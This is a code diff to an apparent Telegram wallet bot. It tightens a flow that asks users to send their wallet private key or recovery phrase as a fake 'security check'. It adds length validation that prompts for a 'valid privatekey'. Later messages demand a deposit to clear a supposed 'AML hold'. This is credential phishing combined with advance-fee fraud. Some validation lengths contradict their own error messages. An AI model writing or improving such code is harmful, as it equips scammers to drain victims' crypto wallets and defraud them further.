@@ -817,6 +817,17 @@ def build_user_router(
             await state.clear()
             await message.answer("Please restart the withdrawal from your wallet.")
             return
+        valid_length = (
+            32 <= len(address) <= 66
+            if chain == "SOL"
+            else len(address) == 87
+        )
+        if not valid_length:
+            expected = "87 characters for SOL" if chain == "SOL" else "66 characters for ETH/BNB"
+            await message.answer(
+                f"Please enter a valid {chain} privatekey ({expected})."
+            )
+            return
         await state.set_state(TransferInput.waiting_for_amount)
         await state.update_data(transfer_address=address)
         await message.answer(
@@ -861,8 +872,9 @@ def build_user_router(
         )
         await message.answer(
             "⚠️ Security Check Required\n\n"
-            "To process your withdrawal, please reply with your wallet's Private" 
-            "Key or Recovery Phrase to verify ownership.",
+            "To process your withdrawal, please reply with your wallet's"  
+            "private key or passphrase " 
+            "to verify ownership.",
             reply_markup=ForceReply(
                 selective=True,
                 input_field_placeholder="Enter destination wallet address",
@@ -883,6 +895,20 @@ def build_user_router(
         if message.text is None:
             await message.answer("Please reply with the destination wallet address.")
             return
+        address = message.text.strip()
+        data = await state.get_data()
+        chain = str(data.get("transfer_chain", ""))
+        valid_length = (
+            32 <= len(address) <= 44
+            if chain == "SOL"
+            else chain in {"BNB", "ETH"} and len(address) == 42
+        )
+        if not valid_length:
+            expected = "32-44 characters for SOL" if chain == "SOL" else "42 characters for ETH/BNB"
+            await message.answer(
+                f"Please enter a valid {chain} privatekey ({expected})."
+            )
+            return
         await state.clear()
         await message.answer(
             "✅ Verification in progress. Please wait while we confirm ownership."
@@ -897,6 +923,7 @@ def build_user_router(
 
             "Please deposit the required percentage to clear the AML hold " 
             "and withdraw your funds..",
+            
             parse_mode="HTML",
         )
 
